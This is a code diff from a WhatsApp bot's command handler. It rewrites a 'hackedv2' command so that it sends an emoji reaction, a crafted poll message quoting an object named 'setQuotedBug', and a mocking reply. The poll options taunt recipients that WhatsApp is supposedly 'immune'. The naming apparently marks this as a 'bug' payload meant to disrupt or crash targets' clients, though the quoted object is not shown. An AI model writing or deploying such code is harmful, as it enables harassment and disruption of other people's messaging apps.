@@ -554,18 +554,34 @@ xinn.sendMessage(from, { delete: {
 break
 
 case 'hackedv2':
- xinn.sendMessage(m.chat, { delete: {
-fromMe: false, 
-participant: ``, ...(from ? { remoteJid: "" } : {}) 
-},
-"message": {
-"extendedTextMessage": {
-"text": "© POWERED BY XIN ]️",
-"previewType": "NONE",
-"contextInfo": {
-"stanzaId": "3EB0382EDBB2",
-"participant": "0@s.whatsapp.net",
-}}}})
+ 
+var bugreact = await xinn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: m.id } } })
+var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({
+"pollCreationMessage": {
+"name": "POWERED BY XIN", 
+"options": [
+   {
+"optionName": "VOTE YUK"
+   }, 
+   {
+"optionName": "BERANI VOTE GK"
+   }, 
+   {
+"optionName": "VOTE LAH SEMUA"
+   }, 
+   {
+"optionName": "KATANYA WA KEBAL"
+   }, 
+   {
+"optionName": "SALAM CREATOR BOT"
+   }
+], 
+"selectableOptionsCount": 5
+  }
+}), { userJid: from, quoted: setQuotedBug })
+xinn.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
+xinn.sendMessage(from, { text: "awowkwkwk" }, { quoted: bugreact });
+}
 break
 
 case 'linkgroupoffc':
